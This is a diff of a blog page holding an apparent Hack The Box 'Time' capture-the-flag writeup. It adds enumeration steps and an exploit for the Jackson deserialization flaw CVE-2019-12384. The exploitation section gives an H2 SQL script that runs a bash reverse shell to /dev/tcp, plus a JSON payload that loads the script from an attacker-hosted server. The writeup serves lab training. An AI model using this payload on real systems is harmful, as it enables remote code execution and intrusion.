@@ -36,11 +36,12 @@
 
   <meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Time HTB Writeup"/>
-<meta name="twitter:description" content="  Enumeration:
- Nmap scan:     let&rsquo;s checkout the running web server:   its a java beautifier and validator.
-  lets check the source code: nothing interesting in the source code
+<meta name="twitter:description" content="Time is a medium machine retired today, but i think it&rsquo;s an easy and straight forward one. enjoy ..
+1. Enumeration:   Nmap scan:
+  nmap -sC -sV 10.10.10.214     Web Enumeration:
+ let&rsquo;s check out the running web server:     And the source code: Nothing interesting in the source code.
   let&rsquo;s search for hidden directories:
-  $ python3 dirsearch.py -u http://10.10.10.223/ -e txt,html,php,log,zip,bac,bak,tar "/>
+  $ python3 dirsearch."/>
 
   <script type="application/ld+json">
 {
@@ -59,7 +60,7 @@
   },
   "genre": "posts",
   "keywords": "Writeups, hackthebox",
-  "wordcount":  38 ,
+  "wordcount":  388 ,
   "url": "https:\/\/hussein-elsayed.github.io\/2021\/time\/",
   "datePublished": "2021-03-26T04:42:47\u002b02:00",
   "dateModified": "2021-03-26T04:42:47\u002b02:00",
@@ -143,7 +144,7 @@
                 in
                 
                 <i class="iconfont icon-timer"></i>
-                1 min
+                2 min
         </div>
     </header>
     <div class="post-content">
@@ -164,34 +165,99 @@
           
           
 
-          <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/1.png" alt="The machine info" class="lazyload"><figcaption class="image-caption">The machine info</figcaption></figure></p>
+          <p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/1.png" alt="Machine info" class="lazyload"><figcaption class="image-caption">Machine info</figcaption></figure></p>
+<p>Time is a medium machine retired today, but i think it&rsquo;s an easy and straight forward one. enjoy ..</p>
+<h3 id="1-enumeration">1. Enumeration:</h3>
 <ul>
 <li>
-<p><strong>Enumeration:</strong></p>
+<p>Nmap scan:</p>
 <ul>
-<li>Nmap scan:
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/2.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
+<li><code> nmap -sC -sV 10.10.10.214</code>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/2.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></li>
 </ul>
 </li>
 <li>
-<p>let&rsquo;s checkout the running web server:
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/3.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
-</li>
-</ul>
-<p>its a java beautifier and validator.</p>
+<p>Web Enumeration:</p>
 <ul>
+<li>let&rsquo;s check out the running web server:
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/3.png" alt="it&rsquo;s a java beautifier and validator" class="lazyload"><figcaption class="image-caption">it&rsquo;s a java beautifier and validator</figcaption></figure></li>
+</ul>
+</li>
 <li>
-<p>lets check the source code:
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/4.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
-nothing interesting in the source code</p>
+<p>And the source code:
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/4.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+Nothing interesting in the source code.</p>
 </li>
 <li>
 <p>let&rsquo;s search for hidden directories:</p>
 </li>
 </ul>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-yml" data-lang="yml"><span style="color:#ae81ff">$ python3 dirsearch.py -u http://10.10.10.223/ -e txt,html,php,log,zip,bac,bak,tar</span>
-</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/5.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
-<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/6.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/5.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/6.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<ul>
+<li>Nothing useful inside them:
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/7.png" alt="error like this apache version we shall search for exploits for it if any" class="lazyload"><figcaption class="image-caption">error like this apache version we shall search for exploits for it if any</figcaption></figure>
+also checking <code>/index.php and /index.php/login</code> &raquo; gives nothing useful and redirects back to the main page</li>
+</ul>
+<h3 id="lets-see-the-app-functionality">Let&rsquo;s see the app functionality:</h3>
+<ul>
+<li>when tried the beautifier &gt; it worked fine</li>
+<li>when tried validator (still in beta version) &raquo; tried some meaningless letters
+<ul>
+<li>gave some suspicious error &raquo; will search with it to see its meaning.</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token &#39;edfgagshh&#39;: was expecting (&#39;true&#39;, &#39;false&#39; or &#39;null&#39;)
+</code></pre></div><p><figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/8.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<ul>
+<li>
+<p>Found out that this <code>com.fasterxml.jackson.core</code> library is vulnerable and leads to RCE.
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/9.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+</li>
+<li>
+<p>Found an exploit for it on github <a href="https://github.com/jas502n/CVE-2019-12384">here</a>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/10.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/11.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+</li>
+</ul>
+<p>To understand the error <a href="https://stackoverflow.com/questions/49822202/com-fasterxml-jackson-databind-exc-mismatchedinputexception-unexpected-token-s">more</a>
+<figure><img src="/images/ring.svg" data-sizes="auto" data-src="/images/time/12.png" alt="" class="lazyload"><figcaption class="image-caption"></figcaption></figure></p>
+<h3 id="exploitation">Exploitation:</h3>
+<p>This is where the deserialization comes in. You need to find the right class for the application to accept. This is where CVE-2019-12384 comes in. Now that we understand how to construct a correct payload, we can abuse it for a shell. Looking over the github, we see that we are using this class: ch.qos.logback.core.db.DriverManagerConnectionSource.</p>
+<p>So now all we gotta do is host the &ldquo;inject.sql&rdquo; on our webserver, modify the &ldquo;inject.sql&rdquo; to execute the code we want (rev shell of course), and to send the application the payload it expects. Breakdown below</p>
+<ol>
+<li>
+<p>Setup your http server to host the malicious content. There&rsquo;s a python script called &lsquo;updog&rsquo; (pip3 install updog) that I like to use. It&rsquo;s quicker than the stupid python3 -m http.server. Fuck typing</p>
+</li>
+<li>
+<p>Create file &lsquo;inject.sql&rsquo; to host on your http server and insert the following code into it:
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+        String[] command = {&ldquo;bash&rdquo;, &ldquo;-c&rdquo;, cmd};
+        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter(&quot;\A&quot;);
+        return s.hasNext() ? s.next() : &ldquo;&quot;;  }
+$$;
+CALL SHELLEXEC(&lsquo;setsid bash -i &amp;&gt;/dev/tcp/IP/PORT 0&gt;&amp;1 &amp;')</p>
+</li>
+<li>
+<p>Replace the IP and PORT above with your HTB IP and netcat listener port</p>
+</li>
+<li>
+<p>Start your netcat listener</p>
+</li>
+<li>
+<p>On the website application, select &ldquo;Validate (beta!)&rdquo; and input this: 
+[&ldquo;ch.qos.logback.core.db.DriverManagerConnectionSource&rdquo;,{&ldquo;url&rdquo;:&ldquo;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &lsquo;http://IP:PORT/inject.sql&rsquo;&quot;}]</p>
+</li>
+<li>
+<p>Replace IP with your HTB IP, and PORT with your server port (updog uses 9090)</p>
+</li>
+<li>
+<p>Submit and you should get a shell.</p>
+</li>
+<li></li>
+</ol>
 
     </div>
 
@@ -205,7 +271,7 @@ nothing interesting in the source code</p>
            
             <p class="copyright-item">
                     <span>Words:</span>
-                   <span>38</span>
+                   <span>388</span>
             </p>
             
             <p class="copyright-item">
